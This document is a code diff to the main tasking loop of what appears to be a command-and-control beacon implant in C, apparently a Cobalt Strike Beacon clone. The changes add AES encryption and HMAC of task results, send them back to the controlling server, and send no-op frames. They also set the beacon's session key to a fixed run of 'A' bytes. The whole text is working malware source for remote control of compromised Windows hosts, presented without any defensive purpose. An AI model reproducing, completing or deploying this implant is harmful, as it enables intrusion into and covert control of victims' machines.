@@ -26,7 +26,6 @@ DEFINESEC(B) VOID BeaconStart( PVOID Key, ULONG Len )
 {
 	BEACON_INSTANCE Ins           = { 0 };
 	UCHAR           Str[MAX_PATH] = { 0 };
-	PVOID           Sum           =   0;
 	PVOID           K32           =   0;
 	PVOID           Ntl           =   0;
 
@@ -97,6 +96,7 @@ DEFINESEC(B) VOID BeaconStart( PVOID Key, ULONG Len )
 		Ins.api.OpenProcessToken     = PeGetFuncEat( Ins.Module[1], H_OPENPROCESSTOKEN );
 		Ins.api.CryptDestroyHash     = PeGetFuncEat( Ins.Module[1], H_CRYPTDESTROYHASH );
 		Ins.api.CryptSetKeyParam     = PeGetFuncEat( Ins.Module[1], H_CRYPTSETKEYPARAM );
+		Ins.api.CryptSetHashParam    = PeGetFuncEat( Ins.Module[1], H_CRYPTSETHASHPARAM );
 		Ins.api.CryptGetHashParam    = PeGetFuncEat( Ins.Module[1], H_CRYPTGETHASHPARAM );
 		Ins.api.LookupAccountSidA    = PeGetFuncEat( Ins.Module[1], H_LOOKUPACCOUNTSIDA );
 		Ins.api.CryptReleaseContext  = PeGetFuncEat( Ins.Module[1], H_CRYPTRELEASECONTEXT );
@@ -160,7 +160,9 @@ DEFINESEC(B) VOID BeaconStart( PVOID Key, ULONG Len )
 									{
 										if ((Hdr = BufferCreate( &Ins, sizeof( BEACON_METADATA_HDR ))))
 										{
+											memset( Ins.BeaconKeys, 'A', 16 );
 											Hdr = BufferAddRaw( &Ins, Hdr, Ins.BeaconKeys, 16 );
+
 											Hdr = BufferAddUI2( &Ins, Hdr, Ins.api.GetACP());
 											Hdr = BufferAddUI2( &Ins, Hdr, Ins.api.GetOEMCP());
 											Hdr = BufferAddUI4( &Ins, Hdr, HTONL(Ins.BeaconId) );
@@ -218,6 +220,12 @@ DEFINESEC(B) VOID BeaconStart( PVOID Key, ULONG Len )
 			Ins.api.LocalFree( Ins.key[0].Ptr );
 		};
 
+		struct __attribute__((packed, scalar_storage_order("big-endian")))
+		{
+			UCHAR AesKey[16];
+			UCHAR MacKey[16];
+		} *Sum = NULL;
+
 		if ( Ins.IsOnline != FALSE )
 		{
 			if ((Sum = Sha256Sum( &Ins, Ins.BeaconKeys, 16 )))
@@ -234,7 +242,7 @@ DEFINESEC(B) VOID BeaconStart( PVOID Key, ULONG Len )
 				AesMacKeyBuffer.Hdr.reserved = 0;
 				AesMacKeyBuffer.Hdr.aiKeyAlg = CALG_AES_128;
 				AesMacKeyBuffer.Len          = 16;
-				RtlCopyMemory( AesMacKeyBuffer.Buf, Sum + 0, 16 );
+				RtlCopyMemory( AesMacKeyBuffer.Buf, Sum->AesKey, 16 );
 
 				Ins.key[1].Ptr = &AesMacKeyBuffer;
 				Ins.key[1].Len = sizeof( AesMacKeyBuffer );
@@ -246,7 +254,7 @@ DEFINESEC(B) VOID BeaconStart( PVOID Key, ULONG Len )
 					AesMacKeyBuffer.Hdr.reserved = 0;
 					AesMacKeyBuffer.Hdr.aiKeyAlg = CALG_RC2; 
 					AesMacKeyBuffer.Len          = 16;
-					RtlCopyMemory( AesMacKeyBuffer.Buf, Sum + 1, 16 );
+					RtlCopyMemory( AesMacKeyBuffer.Buf, Sum->MacKey, 16 );
 
 					Ins.key[2].Ptr = &AesMacKeyBuffer;
 					Ins.key[2].Len = sizeof( AesMacKeyBuffer );
@@ -255,47 +263,61 @@ DEFINESEC(B) VOID BeaconStart( PVOID Key, ULONG Len )
 					{
 						do
 						{
-							PBEACON_TASK_RES_HDR ResHdr = NULL;
-							PBEACON_TASK_ENC_HDR EncHdr = NULL;
-							PVOID                TskPtr = NULL;
-							PVOID                TxtBuf = NULL;
-							ULONG                TxtLen = 0;
-							ULONG                PadLen = 0;
+							PBEACON_TASK_RES_HDR ResHdr     = NULL;
+							PBEACON_TASK_ENC_HDR EncHdr     = NULL;
+							PVOID                TskPtr     = NULL;
+							PVOID                TxtBuf     = NULL;
+							PVOID                AesBuf     = NULL;
+							ULONG                AesLen     = 0;
+							ULONG                TxtLen     = 0;
+							UCHAR                NopBuf     = 0;
+							UCHAR                MacSum[32] = { 0 };
+							ULONG                MacLen     = 0;
+							BOOL                 IsSent     = FALSE;
 
 							if ( TransportRecv( &Ins, &TxtBuf, &TxtLen ) )
 							{
-								//
-								// Check if the buffer is a multiple of
-								// 16. If it is, continue. In the server,
-								// do not send the NO-OP frames to the
-								// Beacon.
-								//
-								if ( CryptAesDecrypt( &Ins, TxtBuf, TxtLen - 16 ) )
+								if ( !( TxtLen % 16 ) )
 								{
-									if ((TskPtr = BeaconTask( &Ins, CPTR( TxtBuf ) )))
+									if ( CryptAesDecrypt( &Ins, TxtBuf, TxtLen ) )
 									{
-										if (( ResHdr = Ins.api.LocalLock( TskPtr )))
+										if ((TskPtr = BeaconTask( &Ins, CPTR( TxtBuf ) )))
 										{
-											PadLen = ( ResHdr->Length + 32 - 1 ) & ~( 32 - 1 );
-
-											if (( EncHdr = Ins.api.LocalAlloc( LPTR, 4 + PadLen + 16 ) ))
+											if (( ResHdr = Ins.api.LocalLock( TskPtr )))
 											{
-												//
-												// TODO:
-												//
-												// AES-128-CBC encrypt the ResHdr and store it in EncHdr.
-												// MAC-SHA-256 the encrypted buffer and store it in EncHdr.
-												// Set length of EncHdr to that of AES + 16
-												//
-												// Send to target.
-												Ins.api.LocalFree( PadPtr );
-											};
-											Ins.api.LocalUnlock( TskPtr );
-										};
+												if ( CryptAesEncrypt( &Ins, ResHdr, ResHdr->Length + 8, &AesBuf, &AesLen ) )
+												{
+													if (( EncHdr = Ins.api.LocalAlloc( LPTR, 4 + AesLen + 16 )))
+													{
+														memset( EncHdr->Buffer, 0, AesLen );
+														memcpy( EncHdr->Buffer, AesBuf, AesLen );
 
-										Ins.api.LocalFree( TskPtr );
+														if ( CryptHmacHash( &Ins,
+																    EncHdr->Buffer,
+																    AesLen,
+																    MacSum ))
+														{
+															EncHdr->Length = AesLen + 16;
+															memcpy( &EncHdr->Buffer[AesLen], MacSum, 16 );
+
+															if ( TransportSend( &Ins, EncHdr, 4 + AesLen + 16 ) )
+															{
+																IsSent = TRUE;
+															};
+														};
+														Ins.api.LocalFree( EncHdr );
+													};
+													Ins.api.LocalFree( AesBuf );
+												};
+												Ins.api.LocalUnlock( TskPtr );
+											};
+											Ins.api.LocalFree( TskPtr );
+										};
 									};
 								};
+								if ( IsSent != TRUE )
+									TransportSend( &Ins, &NopBuf, 1 );
+
 								Ins.api.LocalFree( TxtBuf );
 							};
 						} while ( Ins.IsOnline != FALSE );
